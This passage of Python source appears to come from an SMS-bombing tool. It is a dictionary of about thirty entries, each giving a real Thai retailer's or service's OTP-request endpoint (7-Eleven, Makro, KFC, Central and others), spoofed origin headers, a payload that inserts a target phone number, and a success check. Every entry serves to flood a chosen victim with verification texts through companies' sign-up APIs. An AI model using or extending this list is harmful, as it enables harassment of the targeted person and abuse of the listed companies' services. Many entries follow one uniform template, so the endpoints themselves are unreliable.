        "url": "https://www.allonline.7eleven.co.th/api/v1/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.allonline.7eleven.co.th/", "https://www.allonline.7eleven.co.th"),
        "data": lambda p: {"mobile": p, "type": "register"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api132": {
        "name": "MakroPro",
        "url": "https://api.makro.pro/auth/v1/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.makro.pro/", "https://www.makro.pro"),
        "data": lambda p: {"phoneNumber": f"+66{no_zero(p)}", "channel": "SMS"},
        "success_check": lambda r: strict_check(r, ['"refCode"', '"status":"SUCCESS"', '"otpId"'])
    },
    "api133": {
        "name": "TopsOnline",
        "url": "https://www.tops.co.th/api/v1/auth/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.tops.co.th/th", "https://www.tops.co.th"),
        "data": lambda p: {"phone": p, "countryCode": "+66"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"refCode"'])
    },
    "api134": {
        "name": "VillaMarket",
        "url": "https://shop.villamarket.com/api/v1/auth/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shop.villamarket.com/", "https://shop.villamarket.com"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: strict_check(r, ['"success":true', '"ref"'])
    },
    "api135": {
        "name": "CJMore",
        "url": "https://api.cjmore.co.th/api/v1/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.cjmore.co.th/", "https://www.cjmore.co.th"),
        "data": lambda p: {"phone_number": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref_code"'])
    },
    "api136": {
        "name": "AdviceIT",
        "url": "https://www.advice.co.th/api/member/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.advice.co.th/", "https://www.advice.co.th"),
        "data": lambda p: {"tel": p, "type": "register"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api137": {
        "name": "JIB-Computer",
        "url": "https://www.jib.co.th/web/api/member/request_otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.jib.co.th/", "https://www.jib.co.th"),
        "data": lambda p: {"telephone": p},
        "success_check": lambda r: strict_check(r, ['"status":true', '"ref"'])
    },
    "api138": {
        "name": "BananaIT",
        "url": "https://api.bnn.in.th/api/v1/auth/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.bnn.in.th/th", "https://www.bnn.in.th"),
        "data": lambda p: {"phone_number": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref_code"'])
    },
    "api139": {
        "name": "Studio7TH",
        "url": "https://api.studio7thailand.com/api/v1/auth/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.studio7thailand.com/th", "https://www.studio7thailand.com"),
        "data": lambda p: {"phone_number": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref_code"'])
    },
    "api140": {
        "name": "Mercular",
        "url": "https://api.mercular.com/v1/auth/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.mercular.com/", "https://www.mercular.com"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api141": {
        "name": "JaymartStore",
        "url": "https://api.jaymartstore.com/v1/member/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://jaymartstore.com/", "https://jaymartstore.com"),
        "data": lambda p: {"mobile": p},
        "success_check": lambda r: strict_check(r, ['"status":true', '"ref"'])
    },
    "api142": {
        "name": "ITCityOnline",
        "url": "https://api.itcity.in.th/api/v1/auth/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.itcity.in.th/", "https://www.itcity.in.th"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api143": {
        "name": "HomeProTH",
        "url": "https://www.homepro.co.th/api/v1/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.homepro.co.th/", "https://www.homepro.co.th"),
        "data": lambda p: {"mobile": p, "action": "register"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"refCode"'])
    },
    "api144": {
        "name": "DohomeTH",
        "url": "https://api.dohome.co.th/member/v1/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.dohome.co.th/", "https://www.dohome.co.th"),
        "data": lambda p: {"phoneNumber": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api145": {
        "name": "Boonthavorn",
        "url": "https://api.boonthavorn.com/v1/customers/otp/send",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.boonthavorn.com/", "https://www.boonthavorn.com"),
        "data": lambda p: {"telephone": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api146": {
        "name": "IndexLivingMall",
        "url": "https://api.indexlivingmall.com/v1/auth/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.indexlivingmall.com/", "https://www.indexlivingmall.com"),
        "data": lambda p: {"mobile": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api147": {
        "name": "OfficeMateTH",
        "url": "https://www.ofm.co.th/api/v1/auth/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.ofm.co.th/", "https://www.ofm.co.th"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api148": {
        "name": "PowerBuyTH",
        "url": "https://www.powerbuy.co.th/api/v1/auth/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.powerbuy.co.th/th", "https://www.powerbuy.co.th"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api149": {
        "name": "SupersportsTH",
        "url": "https://www.supersports.co.th/api/v1/auth/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.supersports.co.th/th", "https://www.supersports.co.th"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api150": {
        "name": "CentralOnline",
        "url": "https://www.central.co.th/api/v1/auth/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.central.co.th/th", "https://www.central.co.th"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api151": {
        "name": "Beautrium",
        "url": "https://thebeautrium.com/api/v1/auth/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://thebeautrium.com/", "https://thebeautrium.com"),
        "data": lambda p: {"phone": p, "type": "register"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api152": {
        "name": "Eveandboy",
        "url": "https://api.eveandboy.com/api/v1/auth/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.eveandboy.com/", "https://www.eveandboy.com"),
        "data": lambda p: {"mobile": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api153": {
        "name": "MultyBeauty",
        "url": "https://api.multybeauty.com/v1/auth/otp/send",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.multybeauty.com/", "https://www.multybeauty.com"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api154": {
        "name": "PomeloFashion",
        "url": "https://api.pomelofashion.com/v3/auth/otp/send",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.pomelofashion.com/th/th/", "https://www.pomelofashion.com"),
        "data": lambda p: {"phone": f"+66{no_zero(p)}", "country_code": "TH"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"verification_id"'])
    },
    "api155": {
        "name": "GQSize",
        "url": "https://gqsize.com/api/v1/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gqsize.com/", "https://gqsize.com"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api156": {
        "name": "KFCTH",
        "url": "https://api.kfc.co.th/v1/auth/otp/send",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.kfc.co.th/", "https://www.kfc.co.th"),
        "data": lambda p: {"phone": f"+66{no_zero(p)}", "channel": "sms"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api157": {
        "name": "PizzaHutTH",
        "url": "https://api.pizzahut.co.th/api/v1/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.pizzahut.co.th/", "https://www.pizzahut.co.th"),
        "data": lambda p: {"mobile": p, "lang": "th"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api158": {
        "name": "PunthaiCoffee",
        "url": "https://api.punthaicoffee.com/api/v1/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.punthaicoffee.com/", "https://www.punthaicoffee.com"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    },
    "api159": {
        "name": "PTMaxCard",
        "url": "https://api.maxcard.co.th/api/v1/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.ptgenergy.co.th/", "https://www.ptgenergy.co.th"),
        "data": lambda p: {"mobile_no": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref_code"'])
    },
    "api160": {
        "name": "BangchakGreenMiles",
        "url": "https://api.bcpgreenmiles.com/v1/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.bcpgreenmiles.com/", "https://www.bcpgreenmiles.com"),
        "data": lambda p: {"mobile": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"'])
    }
}
